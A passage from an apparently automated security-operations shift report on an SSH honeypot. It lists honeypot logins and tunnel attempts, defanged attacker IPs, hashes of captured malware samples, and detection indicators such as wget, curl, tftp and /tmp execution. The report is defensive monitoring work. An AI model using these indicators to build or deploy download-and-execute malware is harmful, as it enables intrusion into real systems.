| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:44:31` | `cowrie.session.connect` |
| `2026-08-01 08:44:32` | `cowrie.client.version` |
| `2026-08-01 08:44:32` | `cowrie.client.kex` |
| `2026-08-01 08:44:33` | `cowrie.login.success` |
| `2026-08-01 08:44:33` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf06e68f15b

| Field | Detail |
|---|---|
| **Source IP** | `117.204.1[.]45` |
| **First Seen** | 2026-08-01 08:44 |
| **Last Seen** | 2026-08-01 08:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:44:39` | `cowrie.session.connect` |
| `2026-08-01 08:44:39` | `cowrie.client.version` |
| `2026-08-01 08:44:39` | `cowrie.client.kex` |
| `2026-08-01 08:44:41` | `cowrie.login.success` |
| `2026-08-01 08:44:41` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.204.1[.]45` to AbuseIPDB if not already reported
- [ ] Block `117.204.1[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01f74e653e3c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 08:45 |
| **Last Seen** | 2026-08-01 08:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:45:50` | `cowrie.session.connect` |
| `2026-08-01 08:45:50` | `cowrie.client.version` |
| `2026-08-01 08:45:50` | `cowrie.client.kex` |
| `2026-08-01 08:45:50` | `cowrie.login.success` |
| `2026-08-01 08:45:50` | `cowrie.direct-tcpip.request` |
| `2026-08-01 08:45:50` | `cowrie.direct-tcpip.data` |
| `2026-08-01 08:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e1aa69b5d1

| Field | Detail |
|---|---|
| **Source IP** | `101.126.146[.]145` |
| **First Seen** | 2026-08-01 08:50 |
| **Last Seen** | 2026-08-01 08:50 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 08:50:09` | `cowrie.session.connect` |
| `2026-08-01 08:50:09` | `cowrie.client.version` |
| `2026-08-01 08:50:09` | `cowrie.client.kex` |
| `2026-08-01 08:50:23` | `cowrie.login.success` |
| `2026-08-01 08:50:24` | `cowrie.session.params` |
| `2026-08-01 08:50:24` | `cowrie.command.input` |
| `2026-08-01 08:50:25` | `cowrie.log.closed` |
| `2026-08-01 08:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.146[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.126.146[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.110.200[.]219` | **31** | 2026-08-01 06:13 | 2026-08-01 06:14 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `34.140.142[.]223` | **30** | 2026-08-01 06:19 | 2026-08-01 06:20 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `35.195.51[.]126` | **30** | 2026-08-01 05:35 | 2026-08-01 05:36 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `35.240.24[.]252` | **30** | 2026-08-01 07:08 | 2026-08-01 07:09 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `91.233.83[.]203` | **16** | 2026-08-01 05:30 | 2026-08-01 08:44 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `35.233.102[.]20` | **10** | 2026-08-01 06:45 | 2026-08-01 06:46 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-08-01 05:03 | 2026-08-01 08:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `35.90.224[.]185` | **8** | 2026-08-01 08:17 | 2026-08-01 08:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **4** | 2026-08-01 05:21 | 2026-08-01 08:19 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `194.165.16[.]163` | **4** | 2026-08-01 05:22 | 2026-08-01 05:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **4** | 2026-08-01 06:21 | 2026-08-01 07:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-01 08:36 | 2026-08-01 08:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | **3** | 2026-08-01 06:48 | 2026-08-01 07:21 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]100` | **3** | 2026-08-01 05:56 | 2026-08-01 05:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-08-01 06:53 | 2026-08-01 06:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-08-01 06:00 | 2026-08-01 06:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `155.4.209[.]51` | **2** | 2026-08-01 05:30 | 2026-08-01 05:39 | 4m | 0 | `T1592` | 🟢 LOW |
| `18.217.229[.]190` | **2** | 2026-08-01 06:41 | 2026-08-01 06:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `203.55.131[.]3` | **2** | 2026-08-01 06:14 | 2026-08-01 06:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.151.182[.]31` | **2** | 2026-08-01 07:56 | 2026-08-01 07:57 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.126.146[.]145` | 1 | 2026-08-01 08:50 | 2026-08-01 08:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `110.39.181[.]194` | 1 | 2026-08-01 05:42 | 2026-08-01 05:42 | 1s | 0 | `T1592` | 🟢 LOW |
| `110.78.165[.]192` | 1 | 2026-08-01 05:20 | 2026-08-01 05:20 | 10s | 0 | `T1592` | 🟢 LOW |
| `110.78.252[.]134` | 1 | 2026-08-01 05:08 | 2026-08-01 05:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `113.89.16[.]98` | 1 | 2026-08-01 07:09 | 2026-08-01 07:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.3[.]249` | 1 | 2026-08-01 06:19 | 2026-08-01 06:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.250.19[.]91` | 1 | 2026-08-01 05:13 | 2026-08-01 05:13 | 5s | 0 | `T1592` | 🟢 LOW |
| `120.52.18[.]252` | 1 | 2026-08-01 06:18 | 2026-08-01 06:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.202.146[.]144` | 1 | 2026-08-01 05:49 | 2026-08-01 05:49 | 5s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-08-01 08:18 | 2026-08-01 08:19 | 51s | 0 | `T1592` | 🟢 LOW |
| `170.187.147[.]240` | 1 | 2026-08-01 06:04 | 2026-08-01 06:05 | 59s | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | 1 | 2026-08-01 08:25 | 2026-08-01 08:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]217` | 1 | 2026-08-01 08:18 | 2026-08-01 08:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.22.44[.]30` | 1 | 2026-08-01 06:28 | 2026-08-01 06:28 | 30s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]131` | 1 | 2026-08-01 05:45 | 2026-08-01 05:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.43.56[.]139` | 1 | 2026-08-01 07:14 | 2026-08-01 07:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.149[.]196` | 1 | 2026-08-01 05:26 | 2026-08-01 05:26 | 1s | 0 | `T1592` | 🟢 LOW |
| `183.171.56[.]104` | 1 | 2026-08-01 05:46 | 2026-08-01 05:47 | 3s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]169` | 1 | 2026-08-01 08:28 | 2026-08-01 08:28 | 2s | 0 | `T1592` | 🟢 LOW |
| `188.168.86[.]6` | 1 | 2026-08-01 05:27 | 2026-08-01 05:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `202.84.34[.]85` | 1 | 2026-08-01 05:47 | 2026-08-01 05:48 | 52s | 0 | `T1592` | 🟢 LOW |
| `219.155.7[.]154` | 1 | 2026-08-01 05:51 | 2026-08-01 05:51 | 12s | 0 | `T1592` | 🟢 LOW |
| `220.197.14[.]60` | 1 | 2026-08-01 08:05 | 2026-08-01 08:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.186.68[.]153` | 1 | 2026-08-01 05:41 | 2026-08-01 05:41 | 8s | 0 | `T1592` | 🟢 LOW |
| `222.222.124[.]164` | 1 | 2026-08-01 07:50 | 2026-08-01 07:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.100.248[.]64` | 1 | 2026-08-01 05:41 | 2026-08-01 05:41 | 5s | 0 | `T1592` | 🟢 LOW |
| `34.122.244[.]225` | 1 | 2026-08-01 05:15 | 2026-08-01 05:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.77.36[.]89` | 1 | 2026-08-01 06:45 | 2026-08-01 06:45 | 3s | 0 | `T1592` | 🟢 LOW |
| `37.238.162[.]32` | 1 | 2026-08-01 07:08 | 2026-08-01 07:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-08-01 06:37 | 2026-08-01 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-08-01 06:38 | 2026-08-01 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.74.3[.]137` | 1 | 2026-08-01 07:09 | 2026-08-01 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-08-01 08:35 | 2026-08-01 08:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-08-01 07:38 | 2026-08-01 07:38 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-08-01 08:35 | 2026-08-01 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.172.129[.]91` | 1 | 2026-08-01 04:59 | 2026-08-01 04:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]209` | 1 | 2026-08-01 05:57 | 2026-08-01 05:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]237` | 1 | 2026-08-01 05:27 | 2026-08-01 05:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]35` | 1 | 2026-08-01 05:29 | 2026-08-01 05:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.20.21[.]146` | 1 | 2026-08-01 05:27 | 2026-08-01 05:27 | 13s | 0 | `T1592` | 🟢 LOW |
| `59.98.41[.]27` | 1 | 2026-08-01 06:12 | 2026-08-01 06:12 | 14s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]49` | 1 | 2026-08-01 04:59 | 2026-08-01 04:59 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]65` | 1 | 2026-08-01 05:51 | 2026-08-01 05:51 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.228.40[.]100` | 1 | 2026-08-01 06:37 | 2026-08-01 06:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-08-01 07:39 | 2026-08-01 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]42` | 1 | 2026-08-01 05:28 | 2026-08-01 05:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `71.6.134[.]236` | 1 | 2026-08-01 06:03 | 2026-08-01 06:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.141.116[.]106` | 1 | 2026-08-01 07:46 | 2026-08-01 07:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]21` | 1 | 2026-08-01 07:54 | 2026-08-01 07:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.160.117[.]76` | 1 | 2026-08-01 06:59 | 2026-08-01 06:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.115[.]5` | 1 | 2026-08-01 05:16 | 2026-08-01 05:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `95.87.248[.]223` | 1 | 2026-08-01 05:44 | 2026-08-01 05:44 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **21/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 39/100 | 🟢 LOW | **24/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `196.216.81[.]126` | RW | Liquid Telecommunications Operations Limited | **100** ⚠️ | 50 |
| `111.70.32[.]49` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `62.201.228[.]210` | IQ | IQ Networks for Data and Internet Services Ltd | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `46.101.9[.]55` | GB | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `95.87.248[.]223` | BG | Vivacom Bulgaria EAD | **100** ⚠️ | 50 |
| `45.33.14[.]5` | US | Linode | **100** ⚠️ | 50 |
| `115.241.228[.]34` | IN | Reliance Jio Infocomm Limited | **100** ⚠️ | 50 |
| `96.1.40[.]151` | CA | TELUS Mobility-Ontario | **100** ⚠️ | 50 |
| `65.20.138[.]46` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 280 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 260 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 15 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 13 |

---

## 🔕 False Positive Summary (45 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 39 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 556 cases |
| Tool 34  | Credential Extractor        | ✅ 422 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 23 fingerprints |
| Tool 36  | Command Clustering          | ✅ 14 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 280 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 45 filtered (8.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 140 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 260 priority case(s) shown individually · 72 recon entry/entries in table (20 group(s) consolidating 199 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
